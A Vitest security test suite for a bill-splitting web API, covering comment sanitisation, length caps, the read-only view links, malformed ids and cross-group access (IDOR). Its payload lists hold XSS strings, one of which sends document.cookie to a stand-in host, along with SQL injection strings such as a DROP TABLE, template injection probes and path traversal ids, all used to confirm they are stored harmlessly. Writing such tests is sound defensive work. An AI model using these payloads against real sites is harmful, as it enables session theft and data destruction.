import { afterAll, describe, expect, it } from "vitest";
import { api, cleanupGroups, makeGroup, today } from "../helpers/http";
import { BASE_URL, accessHeaders } from "../helpers/http";

afterAll(cleanupGroups);

const equal = (members: string[]) => ({ mode: "equal", members });
const randomGid = () => {
  const b = new Uint8Array(16);
  crypto.getRandomValues(b);
  return btoa(String.fromCharCode(...b)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
};

async function groupWithBill() {
  const g = await makeGroup();
  const r = await api("POST", `/api/groups/${g.gid}/bills`, {
    description: "Dinner", date: today(), amount: 900, paidBy: g.ids.Alice, split: equal([g.ids.Alice, g.ids.Bob, g.ids.Carol]),
  });
  expect(r.status, r.text).toBe(201);
  return { ...g, bid: r.json.bill.id as string };
}

const comments = (gid: string, bid: string) => `/api/groups/${gid}/bills/${bid}/comments`;

/** Bodies must never leak internals. */
function expectNoLeak(text: string) {
  expect(text).not.toMatch(/D1_ERROR|SQLITE|\bat \S+ \(|\bat async\b|\.ts:\d+|node_modules|stack/i);
}

/** Raw request with full control over headers/body (the helper always adds Content-Type for bodies). */
async function rawFetch(method: string, path: string, init: { contentType?: string; body?: string } = {}) {
  const res = await fetch(`${BASE_URL}${path}`, {
    method,
    redirect: "manual",
    headers: { ...accessHeaders(), ...(init.contentType ? { "Content-Type": init.contentType } : {}) },
    body: init.body,
  });
  const text = await res.text();
  let json: any;
  try {
    json = text ? JSON.parse(text) : undefined;
  } catch {
    /* non-JSON */
  }
  return { status: res.status, headers: res.headers, text, json };
}

describe("comment body: markup, injection and encoding are stored verbatim as data", () => {
  it("HTML / script / SQL-ish / template payloads round-trip unchanged inside JSON", async () => {
    const { gid, bid } = await groupWithBill();
    const payloads = [
      "<script>alert(document.domain)</script>",
      '<img src=x onerror="fetch(`//evil.test/?c=`+document.cookie)">',
      "<svg onload=alert(1)>",
      "javascript:alert(1)",
      "'; DROP TABLE bill_comments; --",
      "\" OR \"1\"=\"1",
      "${7*7} {{7*7}} <%= 7*7 %>",
      "&lt;b&gt; &amp; &#x3C;",
      "[click](javascript:alert(1)) <a href=\"javascript:alert(1)\">x</a>",
      "‮evil‬ ‮ RTL override kept as text",
    ];
    for (const body of payloads) {
      const r = await api("POST", comments(gid, bid), { body });
      expect(r.status, body).toBe(201);
      expect(r.json.comment.body, body).toBe(body.replace(/\s+$/, "").trim());
      expect(r.headers.get("content-type")).toMatch(/^application\/json/);
      expect(r.headers.get("x-content-type-options")).toBe("nosniff");
    }
    const list = await api("GET", comments(gid, bid));
    expect(list.headers.get("content-type")).toMatch(/^application\/json/);
    expect(list.json.comments.map((c: any) => c.body).sort()).toEqual(payloads.map((p) => p.trim()).sort());
    // the table survived the SQL payloads
    expect((await api("GET", `/api/groups/${gid}`)).json.bills[0].commentCount).toBe(payloads.length);
    expectNoLeak(list.text);
  });

  it("NUL / ESC / other control characters never reach storage", async () => {
    const { gid, bid } = await groupWithBill();
    const r = await api("POST", comments(gid, bid), { body: "a\u0000b\u001b[31mc\u0007d\u007fe" });
    expect(r.status).toBe(201);
    expect(r.json.comment.body).toBe("ab[31mcde");
    expect(r.text).not.toMatch(/\\u00(0[0-8b-f]|1[0-9a-f]|7f)/i);
  });

  it("a response never reflects the comment into an HTML context (JSON only)", async () => {
    const { gid, bid } = await groupWithBill();
    const r = await api("POST", comments(gid, bid), { body: "<script>1</script>" });
    expect(r.headers.get("content-type")).not.toMatch(/html/);
    const err = await api("POST", comments(gid, bid), { body: `<script>1</script>${"x".repeat(600)}` });
    expect(err.status).toBe(400);
    expect(err.text).not.toContain("<script>");
  });
});

describe("comment length cap", () => {
  it("500 characters pass, 501 fail", async () => {
    const { gid, bid } = await groupWithBill();
    expect((await api("POST", comments(gid, bid), { body: "x".repeat(500) })).status).toBe(201);
    const r = await api("POST", comments(gid, bid), { body: "x".repeat(501) });
    expect(r.status).toBe(400);
    expect(r.json.error.code).toBe("validation");
    expectNoLeak(r.text);
  });

  it("emoji count as one character each: 500 pass, 501 fail", async () => {
    const { gid, bid } = await groupWithBill();
    const ok = await api("POST", comments(gid, bid), { body: "😀".repeat(500) });
    expect(ok.status, ok.text).toBe(201);
    expect([...ok.json.comment.body]).toHaveLength(500);
    expect((await api("POST", comments(gid, bid), { body: "😀".repeat(501) })).status).toBe(400);
    expect((await api("POST", comments(gid, bid), { body: "สวัสดี".repeat(80) })).status).toBe(201); // 480 Thai chars
    expect((await api("POST", comments(gid, bid), { body: "สวัสดี".repeat(84) })).status).toBe(400); // 504
  });

  it("control chars / edge whitespace do not eat the budget or sneak past the cap", async () => {
    const { gid, bid } = await groupWithBill();
    expect((await api("POST", comments(gid, bid), { body: `  ${"x".repeat(500)}\u0000\u0000  ` })).status).toBe(201);
    expect((await api("POST", comments(gid, bid), { body: `${"x".repeat(250)}\n${"x".repeat(250)}` })).status).toBe(400); // 501 with the newline
  });

  it("an oversized request body is refused (413) before it is parsed", async () => {
    const { gid, bid } = await groupWithBill();
    const r = await api("POST", comments(gid, bid), { body: "x".repeat(40_000) });
    expect(r.status).toBe(413);
    expectNoLeak(r.text);
  });
});

describe("comment / subgroup / move inputs with the wrong shape -> 400, never 5xx", () => {
  it("comment body as number, boolean, null, array, object, nested -> 400", async () => {
    const { gid, bid } = await groupWithBill();
    for (const body of [0, 1, true, false, null, ["x"], [["x"]], { a: "x" }, { toString: "x" }, [], {}]) {
      const r = await api("POST", comments(gid, bid), { body });
      expect(r.status, JSON.stringify(body)).toBe(400);
      expect(r.json.error.code).toBe("validation");
      expectNoLeak(r.text);
    }
    for (const payload of ["null", "[]", '"x"', "42", "true", "{", ""]) {
      const r = await rawFetch("POST", comments(gid, bid), { contentType: "application/json", body: payload });
      expect(r.status, payload).toBe(400);
      expectNoLeak(r.text);
    }
    expect((await api("GET", `/api/groups/${gid}`)).json.bills[0].commentCount).toBe(0);
  });

  it("memberId of the wrong type or from another group -> 400", async () => {
    const A = await groupWithBill();
    const B = await makeGroup();
    for (const memberId of [B.ids.Alice, 1, true, ["x"], { id: "x" }, "' OR 1=1 --"]) {
      const r = await api("POST", comments(A.gid, A.bid), { body: "x", memberId });
      expect(r.status, JSON.stringify(memberId)).toBe(400);
      expectNoLeak(r.text);
    }
  });

  it("subgroup name / memberIds with the wrong shape -> 400", async () => {
    const A = await groupWithBill();
    const B = await makeGroup();
    const bad = [
      { name: ["x"], memberIds: [A.ids.Alice] },
      { name: { a: 1 }, memberIds: [A.ids.Alice] },
      { name: "x", memberIds: A.ids.Alice },
      { name: "x", memberIds: { 0: A.ids.Alice } },
      { name: "x", memberIds: [[A.ids.Alice]] },
      { name: "x", memberIds: [B.ids.Alice] },
      { name: "x", memberIds: [A.ids.Alice, A.ids.Alice] },
      { name: "x".repeat(41), memberIds: [A.ids.Alice] },
    ];
    for (const b of bad) {
      const r = await api("POST", `/api/groups/${A.gid}/subgroups`, b);
      expect(r.status, JSON.stringify(b)).toBe(400);
      expectNoLeak(r.text);
    }
  });

  it("subgroup names are stored as text (markup kept, control chars stripped)", async () => {
    const A = await groupWithBill();
    const r = await api("POST", `/api/groups/${A.gid}/subgroups`, { name: "<b>Duo</b>\u0000", memberIds: [A.ids.Alice] });
    expect(r.status).toBe(201);
    expect(r.json.subgroup.name).toBe("<b>Duo</b>");
  });
});

describe("the view endpoint is read-only", () => {
  it("POST / PUT / PATCH / DELETE on /api/view/:id never succeed (real and fake ids)", async () => {
    const { gid, bid } = await groupWithBill();
    const vid = (await api("POST", `/api/groups/${gid}/view-link`, {})).json.viewId as string;
    for (const id of [vid, randomGid(), "x"]) {
      for (const method of ["POST", "PUT", "PATCH", "DELETE"]) {
        const withBody = await api(method, `/api/view/${id}`, method === "DELETE" ? undefined : { name: "hacked" });
        expect([404, 405], `${method} ${id}`).toContain(withBody.status);
        const bodyless = await rawFetch(method, `/api/view/${id}`);
        expect(bodyless.status, `${method} ${id} (no body)`).toBeGreaterThanOrEqual(400);
        expect(bodyless.status).toBeLessThan(500);
      }
    }
    // sub-paths do not exist either
    for (const sub of ["bills", "comments", "members", "view-link", "merge", "activity"]) {
      for (const method of ["GET", "POST", "DELETE"]) {
        const r = await api(method, `/api/view/${vid}/${sub}`, method === "POST" ? {} : undefined);
        expect([404, 405], `${method} /${sub}`).toContain(r.status);
      }
    }
    // nothing changed
    const after = await api("GET", `/api/groups/${gid}`);
    expect(after.json.group.name).toMatch(/^Test /);
    expect(after.json.bills.map((b: any) => b.id)).toEqual([bid]);
    expect(after.json.bills[0].commentCount).toBe(0);
  });

  it("a view id is not a group id, and a group id is not a view id", async () => {
    const { gid, bid, ids } = await groupWithBill();
    const vid = (await api("POST", `/api/groups/${gid}/view-link`, {})).json.viewId as string;
    const asGroup = [
      ["GET", `/api/groups/${vid}`],
      ["GET", `/api/groups/${vid}/summary`],
      ["GET", `/api/groups/${vid}/activity`],
      ["GET", `/api/groups/${vid}/view-link`],
      ["GET", comments(vid, bid)],
    ] as const;
    for (const [m, p] of asGroup) expect((await api(m, p)).status, p).toBe(404);
    const writes = [
      ["POST", `/api/groups/${vid}/bills`, { description: "x", date: today(), amount: 1, paidBy: ids.Alice, split: equal([ids.Alice]) }],
      ["POST", comments(vid, bid), { body: "x" }],
      ["POST", `/api/groups/${vid}/members`, { name: "Eve" }],
      ["PATCH", `/api/groups/${vid}`, { name: "x" }],
      ["DELETE", `/api/groups/${vid}`, undefined],
      ["POST", `/api/groups/${vid}/view-link`, {}],
    ] as const;
    for (const [m, p, b] of writes) expect((await api(m, p, b)).status, `${m} ${p}`).toBe(404);
    expect((await api("GET", `/api/view/${gid}`)).status).toBe(404);
    expect((await api("GET", `/api/groups/${gid}`)).status).toBe(200); // untouched
  });

  it("the shared snapshot contains neither the group id nor member PromptPay digits (also with 13/15-digit ids)", async () => {
    const { gid, ids } = await groupWithBill();
    const numbers = ["0812345678", "1234567890123", "123456789012345"];
    const names = ["Alice", "Bob", "Carol"];
    for (let i = 0; i < 3; i++) expect((await api("PATCH", `/api/groups/${gid}/members/${ids[names[i]]}`, { promptpay: numbers[i] })).status).toBe(200);
    const vid = (await api("POST", `/api/groups/${gid}/view-link`, {})).json.viewId as string;
    const v = await api("GET", `/api/view/${vid}`);
    expect(v.status).toBe(200);
    expect(v.text).not.toContain(gid);
    for (const n of numbers) expect(v.text).not.toContain(n);
    expect(v.text).not.toContain("812345678");
    expect(v.text).not.toMatch(/promptpay/i);
    expect(JSON.stringify(v.json.members)).not.toMatch(/promptpay/i);
    // it only contains a group name field, no id
    expect(Object.keys(v.json.group).sort()).toEqual(["archived", "createdAt", "currency", "name"]);
    // the real group endpoint still has them (sanity: the test would catch a leak)
    expect((await api("GET", `/api/groups/${gid}`)).text).toContain("0812345678");
  });

  it("security headers and no caching on the view response", async () => {
    const { gid } = await groupWithBill();
    const vid = (await api("POST", `/api/groups/${gid}/view-link`, {})).json.viewId as string;
    const v = await api("GET", `/api/view/${vid}`);
    expect(v.headers.get("cache-control")).toBe("no-store");
    expect(v.headers.get("referrer-policy")).toBe("no-referrer");
    expect(v.headers.get("x-content-type-options")).toBe("nosniff");
    expect(v.headers.get("content-type")).toMatch(/^application\/json/);
  });

  it("a revoked / rotated id is dead immediately", async () => {
    const { gid } = await groupWithBill();
    const v1 = (await api("POST", `/api/groups/${gid}/view-link`, {})).json.viewId as string;
    const v2 = (await api("POST", `/api/groups/${gid}/view-link`, {})).json.viewId as string;
    expect((await api("GET", `/api/view/${v1}`)).status).toBe(404);
    await api("DELETE", `/api/groups/${gid}/view-link`);
    expect((await api("GET", `/api/view/${v2}`)).status).toBe(404);
  });
});

describe("view id brute force and malformed ids", () => {
  it("50 random 22-char ids -> all 404", async () => {
    const ids = Array.from({ length: 50 }, randomGid);
    const results = await Promise.all(ids.map((id) => api("GET", `/api/view/${id}`)));
    for (const [i, r] of results.entries()) {
      expect(r.status, ids[i]).toBe(404);
      expect(r.json.error.code).toBe("not_found");
      expect(r.text).not.toContain('"group"');
    }
  });

  it("wrong-length, wrong-alphabet and injection-shaped ids -> 404 (never 5xx)", async () => {
    const weird = [
      "a", "A".repeat(21), "A".repeat(23), "A".repeat(200), "A".repeat(21) + "!", "A".repeat(21) + "%20", "..%2f..%2fgroups", "%2e%2e",
      encodeURIComponent("' OR '1'='1"), encodeURIComponent("\" OR 1=1 --"), encodeURIComponent("1; SELECT 1"), "null", "undefined", "%00", "%ff",
      "*", "%25", "A".repeat(22) + "/", "A".repeat(22) + "%2f..",
    ];
    for (const id of weird) {
      const r = await api("GET", `/api/view/${id}`);
      // Cloudflare's edge answers some malformed URLs (e.g. %00) with 400 before the Worker runs; both are fine.
      expect([400, 404], `${id} → ${r.status}`).toContain(r.status);
      expectNoLeak(r.text);
    }
  });
});

describe("move / merge: possession of both ids is the authorization", () => {
  it("needs a valid 22-char id for the other group: malformed -> 400, well-formed but unknown -> 404", async () => {
    const { gid, bid } = await groupWithBill();
    const malformed = ["", "short", "A".repeat(21), "A".repeat(23), `${"A".repeat(21)}!`, `${"A".repeat(21)} `, "../etc/passwd", "' OR 1=1 --", 7, null, true, ["x"], { id: "x" }];
    for (const t of malformed) {
      const mv = await api("POST", `/api/groups/${gid}/bills/${bid}/move`, { targetGroupId: t });
      expect(mv.status, `move ${JSON.stringify(t)}`).toBe(400);
      expectNoLeak(mv.text);
      const mg = await api("POST", `/api/groups/${gid}/merge`, { sourceGroupId: t });
      expect(mg.status, `merge ${JSON.stringify(t)}`).toBe(400);
      expectNoLeak(mg.text);
    }
    expect((await api("POST", `/api/groups/${gid}/bills/${bid}/move`, { targetGroupId: randomGid() })).status).toBe(404);
    expect((await api("POST", `/api/groups/${gid}/merge`, { sourceGroupId: randomGid() })).status).toBe(404);
    // the field for the other direction is not accepted
    expect((await api("POST", `/api/groups/${gid}/bills/${bid}/move`, { sourceGroupId: randomGid() })).status).toBe(400);
    expect((await api("POST", `/api/groups/${gid}/merge`, { targetGroupId: randomGid() })).status).toBe(400);
    // a view id can't stand in for a group id
    const other = await makeGroup();
    const vid = (await api("POST", `/api/groups/${other.gid}/view-link`, {})).json.viewId as string;
    expect((await api("POST", `/api/groups/${gid}/bills/${bid}/move`, { targetGroupId: vid })).status).toBe(404);
    expect((await api("POST", `/api/groups/${gid}/merge`, { sourceGroupId: vid })).status).toBe(404);
    // nothing moved
    expect((await api("GET", `/api/groups/${gid}`)).json.bills.map((b: any) => b.id)).toEqual([bid]);
    expect((await api("GET", `/api/groups/${gid}`)).json.group.archived).toBe(false);
  });

  it("error bodies for move / merge do not leak the other group's data", async () => {
    const A = await groupWithBill();
    const B = await makeGroup(["Zoe"], "USD");
    const cur = await makeGroup(["Alice"], "EUR");
    const missing = await api("POST", `/api/groups/${A.gid}/bills/${A.bid}/move`, { targetGroupId: B.gid });
    expect(missing.status).toBe(409);
    // only the names the caller's own bill needs are reported, never the target's members/ids
    expect(missing.text).not.toContain(B.ids.Zoe);
    expect(missing.text).not.toContain("Zoe");
    const mism = await api("POST", `/api/groups/${A.gid}/bills/${A.bid}/move`, { targetGroupId: cur.gid });
    expect(mism.status).toBe(400);
    expect(mism.text).not.toContain(cur.ids.Alice);
  });

  it("bodyless / non-JSON POST to /view-link, /merge and /move -> 415", async () => {
    const { gid, bid } = await groupWithBill();
    const paths = [`/api/groups/${gid}/view-link`, `/api/groups/${gid}/merge`, `/api/groups/${gid}/bills/${bid}/move`, comments(gid, bid), `/api/groups/${gid}/subgroups`];
    for (const p of paths) {
      const none = await rawFetch("POST", p);
      expect(none.status, `${p} (no content-type)`).toBe(415);
      expect(none.json.error.code).toBe("unsupported_media_type");
      for (const ct of ["text/plain", "application/x-www-form-urlencoded", "multipart/form-data; boundary=x", "text/html"]) {
        const r = await rawFetch("POST", p, { contentType: ct, body: "targetGroupId=x&sourceGroupId=x&body=x" });
        expect(r.status, `${p} ${ct}`).toBe(415);
      }
    }
    expect((await api("GET", `/api/groups/${gid}/view-link`)).json.viewId).toBeNull();
    // PUT on a subgroup is a write too
    expect((await rawFetch("PUT", `/api/groups/${gid}/subgroups/${"A".repeat(16)}`)).status).toBe(415);
    // a JSON body is enough for /view-link
    expect((await api("POST", `/api/groups/${gid}/view-link`, {})).status).toBe(201);
  });
});

describe("group ids are the only secret: no endpoint may hand one to someone who only holds another group's id", () => {
  it("the target group's activity after a merge does not contain the source group's id", async () => {
    const S = await groupWithBill();
    const T = await makeGroup();
    expect((await api("POST", `/api/groups/${T.gid}/merge`, { sourceGroupId: S.gid, addMissingMembers: true })).status).toBe(200);
    const acts = await api("GET", `/api/groups/${T.gid}/activity?limit=100`);
    expect(acts.status).toBe(200);
    // Anyone with only T's link (e.g. T's other collaborators) could otherwise read/unarchive/edit S.
    expect(acts.text).not.toContain(S.gid);
    expect((await api("GET", `/api/groups/${T.gid}`)).text).not.toContain(S.gid);
  });

  it("moving a bill leaks neither group id into the other group's activity", async () => {
    const S = await groupWithBill();
    const T = await makeGroup();
    expect((await api("POST", `/api/groups/${S.gid}/bills/${S.bid}/move`, { targetGroupId: T.gid, addMissingMembers: true })).status).toBe(200);
    expect((await api("GET", `/api/groups/${T.gid}/activity?limit=100`)).text).not.toContain(S.gid);
    expect((await api("GET", `/api/groups/${S.gid}/activity?limit=100`)).text).not.toContain(T.gid);
  });
});

describe("IDOR across groups", () => {
  it("comments of group B are unreachable through group A's path (read / write / delete)", async () => {
    const A = await groupWithBill();
    const B = await groupWithBill();
    const cB = (await api("POST", comments(B.gid, B.bid), { body: "B secret" })).json.comment.id as string;
    expect((await api("GET", comments(A.gid, B.bid))).status).toBe(404);
    expect((await api("POST", comments(A.gid, B.bid), { body: "intrude" })).status).toBe(404);
    expect((await api("DELETE", `${comments(A.gid, B.bid)}/${cB}`)).status).toBe(404);
    expect((await api("DELETE", `${comments(A.gid, A.bid)}/${cB}`)).status).toBe(404);
    expect((await api("GET", comments(B.gid, A.bid))).status).toBe(404);
    const still = await api("GET", comments(B.gid, B.bid));
    expect(still.json.comments.map((c: any) => c.body)).toEqual(["B secret"]);
    expect((await api("GET", comments(A.gid, A.bid))).json.comments).toEqual([]);
    // 404 bodies carry no information about B
    const r = await api("GET", comments(A.gid, B.bid));
    expect(r.text).not.toContain("B secret");
    expect(r.text).not.toContain(B.gid);
  });

  it("subgroups of group B are unreachable through group A's path; listing A never shows B's", async () => {
    const A = await makeGroup();
    const B = await makeGroup();
    const sidB = (await api("POST", `/api/groups/${B.gid}/subgroups`, { name: "B crew", memberIds: [B.ids.Alice, B.ids.Bob] })).json.subgroup.id as string;
    expect((await api("PUT", `/api/groups/${A.gid}/subgroups/${sidB}`, { name: "mine now", memberIds: [A.ids.Alice] })).status).toBe(404);
    expect((await api("DELETE", `/api/groups/${A.gid}/subgroups/${sidB}`)).status).toBe(404);
    expect((await api("GET", `/api/groups/${A.gid}/subgroups`)).json.subgroups).toEqual([]);
    expect((await api("GET", `/api/groups/${B.gid}/subgroups`)).json.subgroups).toEqual([
      { id: sidB, name: "B crew", memberIds: [B.ids.Alice, B.ids.Bob] },
    ]);
    // A cannot reference B's members from a subgroup
    expect((await api("POST", `/api/groups/${A.gid}/subgroups`, { name: "x", memberIds: [B.ids.Alice] })).status).toBe(400);
  });

  it("move: a bill of group B cannot be moved out of B through group A's path", async () => {
    const A = await groupWithBill();
    const B = await groupWithBill();
    const r = await api("POST", `/api/groups/${A.gid}/bills/${B.bid}/move`, { targetGroupId: A.gid });
    expect(r.status).toBe(404);
    expect((await api("GET", `/api/groups/${B.gid}`)).json.bills.map((b: any) => b.id)).toEqual([B.bid]);
  });

  it("view-link of B cannot be created, rotated or revoked through A's path", async () => {
    const A = await makeGroup();
    const B = await makeGroup();
    const vB = (await api("POST", `/api/groups/${B.gid}/view-link`, {})).json.viewId as string;
    expect((await api("GET", `/api/groups/${A.gid}/view-link`)).json.viewId).toBeNull();
    await api("DELETE", `/api/groups/${A.gid}/view-link`);
    await api("POST", `/api/groups/${A.gid}/view-link`, {});
    expect((await api("GET", `/api/view/${vB}`)).status).toBe(200);
    expect((await api("GET", `/api/groups/${B.gid}/view-link`)).json.viewId).toBe(vB);
  });
});
